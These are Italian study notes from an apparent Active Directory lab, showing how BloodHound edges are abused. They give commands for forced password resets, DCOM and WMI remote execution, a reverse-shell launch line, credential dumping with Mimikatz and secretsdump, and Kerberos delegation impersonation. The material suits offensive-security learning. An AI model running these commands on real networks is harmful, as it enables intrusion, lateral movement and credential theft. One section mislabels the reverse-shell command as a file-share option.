# BloodHound

- [BloodHound](#bloodhound)
  - [Installazione](#installazione)
  - [Attacchi](#attacchi)
    - [ForceChangePassword](#forcechangepassword)
    - [CanRDP, CanPSRemote, ExecuteDCOM](#canrdp-canpsremote-executedcom)
      - [CanRDP](#canrdp)
      - [CanPSRemote → PowerShell Remoting (WinRM)](#canpsremote--powershell-remoting-winrm)
      - [ExecuteDCOM](#executedcom)
        - [Opzione 1 – Scrivi l'output su uno share di rete (tuo)](#opzione-1--scrivi-loutput-su-uno-share-di-rete-tuo)
        - [Opzione 2 – Reverse shell](#opzione-2--reverse-shell)
    - [AdminTo](#adminto)
        - [Opzione 1 – PSExec (shell interattiva)](#opzione-1--psexec-shell-interattiva)
        - [Opzione 2 – WMIExec](#opzione-2--wmiexec)
        - [Opzione 3 – PSRemote (se abilitato)](#opzione-3--psremote-se-abilitato)
          - [Può succedere che:](#può-succedere-che)
        - [Opzione 4 – Dumping credenziali (il vero valore di AdminTo)](#opzione-4--dumping-credenziali-il-vero-valore-di-adminto)
    - [AddMember](#addmember)
      - [Differenza con AddSelf](#differenza-con-addself)
    - [AllowedToDelegate](#allowedtodelegate)
      - [Come funziona concettualmente](#come-funziona-concettualmente)
      - [Come abusarlo?](#come-abusarlo)
        - [Perché è così potente?](#perché-è-così-potente)
        - [Constrained vs Unconstrained Delegation](#constrained-vs-unconstrained-delegation)


BloodHound usa Graph Theory.
![alt text](images/bloodhound/graphBloodHound1.png)

Grace è membro di SQL Admins.

## Installazione
TODO Prima o poi lo scriverò...




## Attacchi

### ForceChangePassword
![alt text](images/bloodhound/ForceChangePassword.png)

Grace -> fa parte del gruppo **PasswordReset** -> ha il **"ForceChangePassword"** su Rosy

```
PS C:\Tools> . .\PowerView.ps1
PS C:\Tools> $SecPassword = ConvertTo-SecureString 'Password11' -AsPlainText -Force
PS C:\Tools>  $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\grace', $SecPassword)
PS C:\Tools> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
PS C:\Tools> Set-DomainUserPassword -Identity rosy -AccountPassword $UserPassword -Credential $Cred
```

E poi ti puoi loggare come `rosy` sulla workstation in cui può loggarsi (questo puoi vederlo su BloodHound, selezionando `rosy` e premendo **"First Degree RDP Privileges"**).


### CanRDP, CanPSRemote, ExecuteDCOM
Li vedi dal sottomenu "Execution Rigths"
![alt text](images/bloodhound/canRDP_canPSREmote_ExecuteDCOM.png)

#### CanRDP
Rosy -> CanRDP -> SRV01

- Su BloodHound, selezionando `rosy` e premendo **"First Degree RDP Privileges"**

Accedi con:
- Remote Desktop Controller
- `xfreerdp /v:SRV01 /u:rosy /p:Password99 /dynamic-resolution /drive:.,linux`

Ti apre una sessione grafica completa. È il metodo più "rumoroso" perché crea una sessione interattiva ben visibile nei log.

#### CanPSRemote → PowerShell Remoting (WinRM)
Rosy -> CanPSRemote -> SRV01

- In teoria dovrebbe essere sotto "Execution Rights" (nel lab non c'era). //TODO da confermare!

```
PS C:\Tools> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
PS C:\Tools> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\rosy', $SecPassword)
PS C:\Tools> Enter-PSSession -ComputerName SRV01 -Credential $Cred
[SRV01]: PS C:\Users\rosy\Documents> $env:username
rosy
[SRV01]: PS C:\Users\rosy\Documents> $env:computername
SRV01
```

Ti dà una shell PowerShell remota su SRV01. Usa la porta 5985 (WinRM). **Meno rumoroso di RDP perché non crea sessione grafica.**

#### ExecuteDCOM
Rosy -> ExecuteDCOM" -> SRV01

```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\rosy', $SecPassword)

$ComputerName = "SRV01.INLANEFREIGHT.HTB"
$ProgId = "MMC20.Application"
$Type = [Type]::GetTypeFromProgID($ProgId, $ComputerName)
$ComObject = [Activator]::CreateInstance($Type)

# Esegui un comando tramite il COM object
$ComObject.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami > C:\output.txt", "7")
```
In questo caso scriverà un file sul SRV01 (non proprio utile, dovresti poi entrarci con Enter-PSSession per esempio). Ma si può anche fare:

##### Opzione 1 – Scrivi l'output su uno share di rete (tuo)
```
$ComObject.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c powershell -e <base64_reverseshell>", "7")
```
L'output arriva direttamente sul tuo attacker host.

##### Opzione 2 – Reverse shell
```
$ComObject.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c powershell -e <base64_reverseshell>", "7")
```
Ti apre una shell interattiva verso il tuo attacker host.

> Quindi quando ha senso usare ExecuteDCOM?
>
>Tipicamente lo usi per scaricare ed eseguire un payload (reverse shell, beacon C2) sulla macchina remota, non per leggere output. È un punto di ingresso, non uno strumento interattivo.

### AdminTo
![alt text](images/bloodhound/AdminTo.png)
- AdminTo significa che Sarah è Local Administrator su SRV01, quindi hai il massimo dei privilegi sulla macchina. 
- AdminTo è l'edge più potente perché ti dà controllo completo della macchina, inclusa la possibilità di rubare credenziali di altri utenti loggati su quella macchina. 
- Puoi sfruttarlo in diversi modi.

##### Opzione 1 – PSExec (shell interattiva)
```
# Da Linux
impacket-psexec INLANEFREIGHT.HTB/sarah:Password12@SRV01

# Da Windows
.\PsExec.exe \\SRV01 -u INLANEFREIGHT\sarah -p Password12 cmd.exe
```

##### Opzione 2 – WMIExec
```
impacket-wmiexec INLANEFREIGHT.HTB/sarah:Password12@SRV01
```

##### Opzione 3 – PSRemote (se abilitato)
```
$SecPassword = ConvertTo-SecureString 'Password12' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\sarah', $SecPassword)

Enter-PSSession -ComputerName SRV01 -Credential $Cred
```

Essere local admin non implica automaticamente poter usare PSRemote, perché WinRM è un servizio separato che deve essere:
- Avviato sul target (WinRM service running)
- Configurato per accettare connessioni remote (Enable-PSRemoting)
- Non bloccato dal firewall (porta 5985)

###### Può succedere che:
![alt text](images/bloodhound/esempio_sarah_adminTo.png)

Nel Node Info di Sarah trovi:
```
OUTBOUND OBJECT CONTROL  (o LOCAL ADMIN RIGHTS)
  └── First Degree Local Admin: 1  → SRV01
```
Oppure dal lato di SRV01:
```
LOCAL ADMINS
  └── First Degree Local Admins → sarah appare qui
```

Ma con **AdminTo** puoi comunque abilitare tu stesso WinRM da remoto:
```
# Se hai AdminTo puoi abilitare WinRM tramite WMI
Invoke-WmiMethod -ComputerName SRV01 -Credential $Cred -Class Win32_Process -Name Create -ArgumentList "powershell Enable-PSRemoting -Force"
```
> Ma è più rumoroso e macchinoso. Meglio usare direttamente PSExec o secretsdump con AdminTo.

##### Opzione 4 – Dumping credenziali (il vero valore di AdminTo)
```
# Da Linux
impacket-secretsdump INLANEFREIGHT.HTB/sarah:Password12@SRV01

# Da Windows con Mimikatz
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### AddMember
![alt text](images/bloodhound/AddMember.png)

- AddMembers su ITManagers significa che Martha può aggiungere utenti al gruppo ITManagers.
- Da solo non sembra utile, ma diventa potente quando guardi cosa può fare il gruppo ITManagers nel grafo! Magari ha qualche local admin in qualche altra parte!

Aggiungere nel gruppo:
```
$SecPassword = ConvertTo-SecureString 'Password13' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\martha', $SecPassword)

# Aggiunge martha stessa al gruppo ITManagers - Comando POWERVIEW (includilo prima)
Add-DomainGroupMember -Identity 'ITManagers' -Members 'martha' -Credential $Cred -Verbose

# Verifica che è stato aggiunto nel gruppo
Get-DomainGroupMember -Identity 'ITManagers' -Credential $Cred
```

#### Differenza con AddSelf
![alt text](images/bloodhound/AddMemberVSAddSelf.png)

`AddMembers` è più potente perché puoi aggiungere anche altri utenti, non solo te stesso.


### AllowedToDelegate
AllowedToDelegate è un privilegio di Kerberos Constrained Delegation. Significa che Ester può impersonare qualsiasi utente quando accede a SRV01.
![alt text](images/bloodhound/AllowedToDelegate.png)

- Da Ester lo trovi sotto **Constrained Delegation Privileges**.
- Pre-build query: **Find Computers with Constrained Delegation**

#### Come funziona concettualmente
```
Normalmente:
Utente → autentica se stesso → SRV01

Con Constrained Delegation:
Ester → impersona Domain Admin → SRV01
"Sto accedendo a SRV01 per conto di Domain Admin"
```
AD si fida di Ester per fare questo, quindi le permette di richiedere ticket Kerberos per conto di altri utenti, limitatamente a SRV01.

#### Come abusarlo?
L'obiettivo è impersonare un utente privilegiato (es. Administrator) su SRV01.

Da Linux con impacket:
```
# 1. Richiedi un ticket per Administrator su SRV01 impersonandolo come Ester
impacket-getST -spn cifs/SRV01.INLANEFREIGHT.HTB \
  -impersonate Administrator \
  INLANEFREIGHT.HTB/ester:Password15

# 2. Usa il ticket ottenuto
export KRB5CCNAME=Administrator.ccache

# 3. Accedi a SRV01 come Administrator
impacket-psexec -k -no-pass SRV01.INLANEFREIGHT.HTB
```

Da Windows con Rubeus:
```
# 1. Richiedi il ticket
.\Rubeus.exe s4u /user:ester /password:Password15 /impersonateuser:Administrator /msdsspn:cifs/SRV01.INLANEFREIGHT.HTB /ptt

# 2. Ora hai il ticket in memoria, accedi
.\PsExec.exe \\SRV01 cmd.exe

# Puoi accedere anche in altri modi, tipo con winrs
```

##### Perché è così potente?
![alt text](images/bloodhound/allowedToDelegate_potente.png)

##### Constrained vs Unconstrained Delegation
![alt text](images/bloodhound/ConstrainedvsUnconstrainedDelegation.png)


